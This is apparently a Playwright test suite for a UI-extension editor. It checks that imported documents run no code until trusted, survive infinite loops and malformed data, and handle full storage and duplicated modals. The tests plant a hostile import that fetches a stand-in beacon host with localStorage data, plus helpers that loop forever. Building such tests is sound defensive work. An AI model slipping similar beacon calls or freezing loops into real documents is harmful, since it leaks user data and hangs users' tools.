/**
 * End-to-end checks for the highest-severity review findings: imported documents don't run code
 * until trusted (robustness-1), runaway loops and malformed documents never freeze or break the
 * editor (robustness-3 / -4 / -6), a full browser storage doesn't hide saved projects
 * (robustness-5), and copies of a modal close their own modal (functional-1).
 */
import { writeFileSync } from 'node:fs';
import { expect, test, type Page } from '@playwright/test';
import { addFromPalette, cardNodes, cardRoot, expectInspectorFor, inspector, layerRow, openEditor, setMode, showLeftTab, MOD } from './helpers';

const topBar = (page: Page) => page.getByRole('banner', { name: 'Editor top bar' });

interface StoredNode {
  id: string;
  type: string;
  props: Record<string, unknown>;
  children: string[];
  text?: string;
}
interface StoredProject {
  id: string;
  name: string;
  app: { name: string };
  extensions: Array<{ rootId: string; helpers?: string; nodes: Record<string, StoredNode> }>;
}

/** The open project as saved by the editor (Ctrl+S first). */
async function savedProject(page: Page): Promise<StoredProject> {
  await page.keyboard.press(`${MOD}+s`);
  return page.evaluate(() => {
    const id = localStorage.getItem('uiex-builder:last-project');
    return JSON.parse(localStorage.getItem(`uiex-builder:project:${id}`)!) as StoredProject;
  });
}

/** A copy of `base` (new id and name) with extra top-level Text nodes and helper code. */
function documentFrom(base: StoredProject, name: string, texts: string[], helpers?: string): StoredProject {
  const doc = JSON.parse(JSON.stringify(base)) as StoredProject;
  doc.id = `p_${name.replace(/\W/g, '').toLowerCase()}`;
  doc.name = name;
  doc.app.name = name;
  const ext = doc.extensions[0];
  texts.forEach((text, i) => {
    const id = `n_review${i}`;
    ext.nodes[id] = { id, type: 'Text', props: {}, children: [], text };
    ext.nodes[ext.rootId].children.push(id);
  });
  if (helpers !== undefined) ext.helpers = helpers;
  return doc;
}

async function importDocument(page: Page, path: string): Promise<void> {
  await page.getByLabel('Import .uiex.json file').setInputFiles(path);
}

/** Resolves 'responsive' if the page answers within 5 s. */
async function responsive(page: Page): Promise<string> {
  return Promise.race([
    page.evaluate(() => 'responsive'),
    new Promise<string>((resolve) => setTimeout(() => resolve('hung'), 5000)),
  ]);
}

test.describe('review: imported documents are safe', () => {
  test('an imported document runs none of its code until the user trusts it (robustness-1)', async ({ page }, testInfo) => {
    const beacons: string[] = [];
    await page.route('http://beacon.invalid/**', (route) => {
      beacons.push(route.request().url());
      return route.fulfill({ status: 204, body: '' });
    });
    await openEditor(page);
    const base = await savedProject(page);
    const doc = documentFrom(
      base,
      'Looks normal',
      ["Hi {{ (fetch('http://beacon.invalid/text?' + localStorage.length), 'there') }}", 'Plain {{ context.user.firstName }}'],
      "export const leak = fetch('http://beacon.invalid/helpers');",
    );
    const file = testInfo.outputPath('hostile.uiex.json');
    writeFileSync(file, JSON.stringify(doc));
    await importDocument(page, file);
    const notice = cardRoot(page).getByRole('region', { name: 'Paused code' });
    await expect(notice).toBeVisible();
    await expect(page.getByText(/Its code is paused until you trust it/).first()).toBeVisible();
    // Simple values still render; the paused expression shows as its source.
    await expect(cardRoot(page).locator('[data-node-id="n_review1"]')).toHaveText('Plain Jordan');
    await expect(cardRoot(page).locator('[data-node-id="n_review0"]')).toContainText('Hi {{ (fetch(');
    await setMode(page, 'Preview');
    await page.waitForTimeout(800);
    expect(beacons).toEqual([]);
    // Still paused after a reload.
    await page.reload();
    await expect(cardRoot(page).getByRole('region', { name: 'Paused code' })).toBeVisible();
    await page.waitForTimeout(500);
    expect(beacons).toEqual([]);
    // The user decides to trust it: now the code runs.
    await cardRoot(page).getByRole('button', { name: 'Trust and run code' }).click();
    await expect(cardRoot(page).getByRole('region', { name: 'Paused code' })).toBeHidden();
    await expect.poll(() => beacons.length).toBeGreaterThan(0);
  });

  test('an infinite loop in imported helpers never freezes the tab, before or after trusting (robustness-3)', async ({ page, context }, testInfo) => {
    await openEditor(page);
    const base = await savedProject(page);
    const doc = documentFrom(base, 'Loops', ['Value {{ spin() }}'], 'export function spin() { while (true) {} }\nwhile (true) {}');
    const file = testInfo.outputPath('loop.uiex.json');
    writeFileSync(file, JSON.stringify(doc));
    // Through Project › Open…, which used to save the document as last project before it rendered.
    await topBar(page).getByRole('button', { name: 'Project', exact: true }).click();
    await page.getByRole('menuitem', { name: /Open/ }).click();
    await page.getByRole('dialog', { name: 'Projects' }).locator('input[type="file"]').setInputFiles(file);
    await expect(cardRoot(page).getByRole('region', { name: 'Paused code' })).toBeVisible();
    expect(await responsive(page)).toBe('responsive');
    await cardRoot(page).getByRole('button', { name: 'Trust and run code' }).click();
    await page.waitForTimeout(2500);
    expect(await responsive(page)).toBe('responsive');
    await expect(page.getByTestId('canvas')).toBeVisible();
    // Opening the app again (the document is the last project now) still works.
    const again = await context.newPage();
    await again.goto('/');
    await expect(again.getByTestId('canvas')).toBeVisible({ timeout: 15_000 });
    expect(await responsive(again)).toBe('responsive');
  });

  test('cyclic and malformed documents are rejected or repaired instead of hanging or white-screening (robustness-4 / -6)', async ({ page }, testInfo) => {
    await openEditor(page);
    const base = await savedProject(page);
    // The root listed as its own grandchild: a cycle.
    const cyclic = documentFrom(base, 'Cycle', ['x']);
    cyclic.extensions[0].nodes.n_review0.children = [cyclic.extensions[0].rootId];
    const cycleFile = testInfo.outputPath('cycle.uiex.json');
    writeFileSync(cycleFile, JSON.stringify(cyclic));
    await importDocument(page, cycleFile);
    await expect(page.getByText(/Import failed/).first()).toBeVisible();
    expect(await responsive(page)).toBe('responsive');
    await expect(page.getByTestId('canvas')).toBeVisible();

    // Wrong field types that used to crash the editor are repaired on import.
    const broken = documentFrom(base, 'Broken fields', ['still here']) as unknown as Record<string, unknown> & StoredProject;
    const ext = broken.extensions[0] as unknown as Record<string, unknown>;
    delete ext.location;
    ext.objectTypes = 'contacts';
    (broken.extensions[0].nodes.n_review0 as unknown as Record<string, unknown>).props = null;
    const brokenFile = testInfo.outputPath('broken.uiex.json');
    writeFileSync(brokenFile, JSON.stringify(broken));
    await importDocument(page, brokenFile);
    await expect(cardNodes(page, 'Text').filter({ hasText: 'still here' })).toBeVisible();
    await page.reload();
    await expect(cardNodes(page, 'Text').filter({ hasText: 'still here' })).toBeVisible();
  });
});

test.describe('review: saving and copies', () => {
  test('a full browser storage keeps saved projects listed and says why saving failed (robustness-5)', async ({ page }) => {
    await openEditor(page);
    await addFromPalette(page, 'Button');
    await inspector(page).getByRole('combobox', { name: 'Text content' }).fill('My important work');
    await expect(topBar(page).getByText('Saved locally')).toBeVisible();
    // Fill the rest of the origin's storage.
    await page.evaluate(() => {
      let lo = 0;
      let hi = 20_000_000;
      while (lo < hi) {
        const mid = Math.ceil((lo + hi) / 2);
        try {
          localStorage.setItem('filler', 'x'.repeat(mid));
          lo = mid;
        } catch {
          hi = mid - 1;
        }
      }
      localStorage.setItem('filler', 'x'.repeat(Math.max(0, lo - 20)));
    });
    await inspector(page).getByRole('combobox', { name: 'Text content' }).fill(`My important work ${'and more '.repeat(20)}`);
    await expect(topBar(page).getByText('Storage full')).toBeVisible();
    await topBar(page).getByRole('button', { name: 'Project', exact: true }).click();
    await page.getByRole('menuitem', { name: /Open/ }).click();
    const dialog = page.getByRole('dialog', { name: 'Projects' });
    await expect(dialog.getByText('No saved projects')).toHaveCount(0);
    await expect(dialog.getByText('my-ui-extensions-app').first()).toBeVisible();
    await page.keyboard.press('Escape');
    // A reload restores the last saved version instead of a blank project.
    await page.reload();
    await expect(cardNodes(page, 'Button')).toHaveText('My important work');
  });

  test('a duplicated button with a modal opens and closes its own modal (functional-1 / code-1)', async ({ page }) => {
    await openEditor(page);
    await addFromPalette(page, 'Button');
    await expectInspectorFor(page, 'Button');
    await inspector(page).getByRole('button', { name: 'Add modal' }).click();
    await expectInspectorFor(page, 'Modal');
    // Duplicate the button (with its modal) from the layers tree.
    await showLeftTab(page, 'Layers');
    await layerRow(page, 'Button').first().click();
    await page.keyboard.press(`${MOD}+d`);
    await expect(cardNodes(page, 'Button').filter({ hasText: 'Click me' })).toHaveCount(2);
    await expect(page.locator('.ub-cv-sb-frame')).toHaveCount(2);
    // No problems about missing or duplicate overlays.
    await expect(topBar(page).getByRole('button', { name: 'No problems — ready to export' })).toBeVisible();

    await setMode(page, 'Preview');
    await cardNodes(page, 'Button').filter({ hasText: 'Click me' }).nth(1).click();
    const modal = cardRoot(page).locator('[data-node-type="Modal"]');
    await expect(modal).toHaveCount(1);
    await expect(modal).toBeVisible();
    await modal.getByText('Cancel', { exact: true }).click();
    await expect(modal).toBeHidden();
    await cardNodes(page, 'Button').filter({ hasText: 'Click me' }).first().click();
    await expect(modal).toBeVisible();
    await modal.getByText('Cancel', { exact: true }).click();
    await expect(modal).toBeHidden();
  });
});
